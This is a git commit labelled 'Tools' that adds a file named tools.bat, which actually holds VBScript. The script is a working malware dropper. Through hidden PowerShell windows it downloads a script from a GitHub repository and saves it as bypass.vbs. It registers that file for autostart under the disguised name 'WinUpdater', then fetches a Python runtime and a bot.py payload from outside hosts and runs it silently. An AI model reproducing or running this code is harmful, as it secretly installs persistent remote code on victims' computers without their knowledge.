5bdab9d69de968e7387ec190694b8de9b3281380
thanhpc777 <153440335+thanhpc777@users.noreply.github.com>
2025-01-20 03:46:15 +0700

    Tools
    Tools

---
+++ tools.bat
@@ -0,0 +1,26 @@
+Set objShell = CreateObject("WScript.Shell")
+
+
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""New-Item -ItemType Directory -Force -Path C:\Downloads""", 0, True
+WScript.Sleep 1000
+
+
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -Uri https://raw.githubusercontent.com/thanhpc777/vt404k7/refs/heads/main/start-up.bat -OutFile C:\Downloads\bypass.vbs""", 0, True
+
+
+objShell.Run "reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /f /v WinUpdater /t REG_SZ /d ""C:\Downloads\bypass.vbs""", 0, True
+
+
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://mienx.com/python-3.10.0-embed-amd64.zip -OutFile C:\Users\Public\Document.zip""", 0, True
+
+
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""Expand-Archive C:\Users\Public\Document.zip -DestinationPath C:\Users\Public\Document""", 0, True
+
+
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""Invoke-WebRequest -URI https://raw.githubusercontent.com/thanhpc777/vt404k7/refs/heads/main/bot.py -OutFile C:\Users\Public\Document\script.py""", 0, True
+
+
+objShell.Run "powershell.exe -WindowStyle hidden -Command ""C:\Users\Public\Document\python C:\Users\Public\Document\script.py""", 0, True
+
+
+WScript.Quit
